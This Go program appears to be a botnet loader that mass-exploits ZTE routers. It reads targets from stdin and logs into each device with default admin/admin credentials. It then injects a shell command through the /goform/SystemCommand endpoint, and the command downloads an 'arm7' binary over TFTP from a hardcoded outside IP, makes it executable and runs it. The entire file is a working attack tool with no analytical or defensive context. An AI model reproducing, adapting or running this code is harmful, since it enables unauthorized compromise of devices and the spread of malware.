package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	port = os.Args[1]

	wg sync.WaitGroup

	timeout = 10 * time.Second

	processed uint64
	found     uint64
	exploited uint64

	payload = "cd+%2Fvar%2Ftmp%3Brm+-rf+.sss%3Btftp+-g+-l+.sss+-r+arm7+91.92.247.58%3Bchmod+7777+.sss%3B.%2F.sss+zte"
)

func findDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "")
}

func sendPayload(target, cookie string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	data := "command=" + payload + "&SystemCommandSubmit=Apply"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /goform/SystemCommand HTTP/1.1\r\nReferer: http://" + target + "/adm/system_command.asp\r\nCookie: mLangage=en; auth=pass; mod=admin; sbkey=" + cookie + "\r\nHost: " + target + "\r\nContent-Length: " + cntLen + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	fmt.Printf("[ZTE] %s executed\n", target)
	exploited++
}
func loginDevice(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	data := "user=admin&psw=admin&save_login=0"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /goform/login HTTP/1.0\r\nReferer: http://" + target + "/login.asp\r\nContent-Length: " + cntLen + "\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "Set-Cookie: sbkey=") {
		cookieStr := strings.Split(buff.String(), "Set-Cookie: sbkey=")

		if len(cookieStr) > 1 {
			cookie := strings.Split(cookieStr[1], ";")
			return cookie[0]
		}
	}
	return ""
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	found++

	cookie := loginDevice(target)

	if cookie == "" {
		return
	}

	fmt.Printf("[ZTE] logged in to %s with cookie [%s]\n", target, cookie)

	sendPayload(target, cookie)
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Exploited: %d\n", processed, found, exploited)
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	for scanner.Scan() {

		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
